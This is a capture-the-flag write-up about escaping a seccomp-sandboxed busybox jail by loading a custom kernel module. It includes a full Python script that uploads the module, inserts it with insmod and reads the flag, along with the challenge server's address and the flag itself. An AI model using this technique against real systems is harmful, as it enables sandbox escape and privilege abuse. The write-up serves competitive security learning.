In the zip file given, there is a linux kernel image, an executable, a C program source code, a CPIO rootfs file, and a run script.

The run script itself looks like a regular qemu run command, but I prepended `#!/bin/sh` to it so I can execute it properly.

Decompressing the CPIO rootfs reveals a linux root directory, with an unusual folder named 'penjara' containing `busybox` and `sh` binaries, which can be used to solve the challenge.
The flag seems to be located at `/root/flag.txt`.
Obviously, I can see that this is going to be one of those rootfs jail challenges.

`main.c` clarifies this, the program basically adds seccomp rules to block the commands that can be used/abused to escape the rootfs jail. I assume `main` is invoked on init. 
I thought this challenge is going to be impossible. But, however...

# busybox
BusyBox v1.35.0 (2023-12-25 17:04:41 UTC) multi-call binary.

Usage: busybox [function [arguments]...]
   or: busybox --list[-full]
   or: busybox --show SCRIPT

	BusyBox is a multi-call binary that combines many common Unix
	utilities into a single executable.  Most people will create a
	link to busybox for each function they wish to use and BusyBox
	will act like whatever it was invoked as.

`insmod` and `modprobe`, which are available as busybox functions, aren't explicitly blocked in the seccomp rules. I can use this to load kernel modules. 
After some digging, I found this: https://github.com/SECCON/SECCON2022_final_CTF/tree/main/jeopardy/pwnable/babyescape/solver/driver. I can modify the driver source code to something like this:
![](attachments/Pasted%20image%2020250831010336.png)
![](attachments/Pasted%20image%2020250831005945.png)
The running kernel version is `linux 6.16.0`, so I can just download the source code, compile it, and build the kernel module for that version of the linux kernel specifically.
![](attachments/Pasted%20image%2020250831010622.png)
After that, I can just run this script in the directory that contains the `run.sh` script, making sure that the compiled kernel driver, `pwn.ko` exists in the same directory:
```
import base64
import time
from ptrlib import *

def run(cmd):
    sock.sendlineafter("# ", cmd)

kernel = base64.b64encode(
    open("pwn.ko", "rb").read()
).decode()

sock = Process("./run.sh", cwd=".")

# Create kernel driver
for block in chunks(kernel, 1000):
    run(f'echo "{block}" >> b64')
run("busybox base64 -d b64 > pwn.ko")
run("busybox rm b64")

# Install kernel module
run("busybox insmod pwn.ko")
run("busybox mknod modpwn c 60 1")

# Invoke exploit
run("busybox cat modpwn")

# Get flag
time.sleep(1)
run("busybox cat /flag.txt")

# Drain and print all buffered output
while True:
    try:
        data = sock.recv(timeout=0.2)  # try to read with small timeout
        if not data:
            break
        print(data.decode(errors="ignore"), end="")
    except TimeoutError:
        break

# Then attach to interactive shell
sock.sh()
```

Yep, it works. Now I can use it on the remote server, using `sock = Socket("18.143.31.243", 9008)`
But since the connection was very bad at the time the competition was going and the machine didn't reset (someone also left their payload kek), I just did this:
![](attachments/roblox.png)
That's it. lol. The flag is: `GEMASTIK18{ingfokan_pemabaran_roblox_muncak_gunung}`
~~nevermind, pwn.ko is and has always been in the remote root dir, not fun.~~
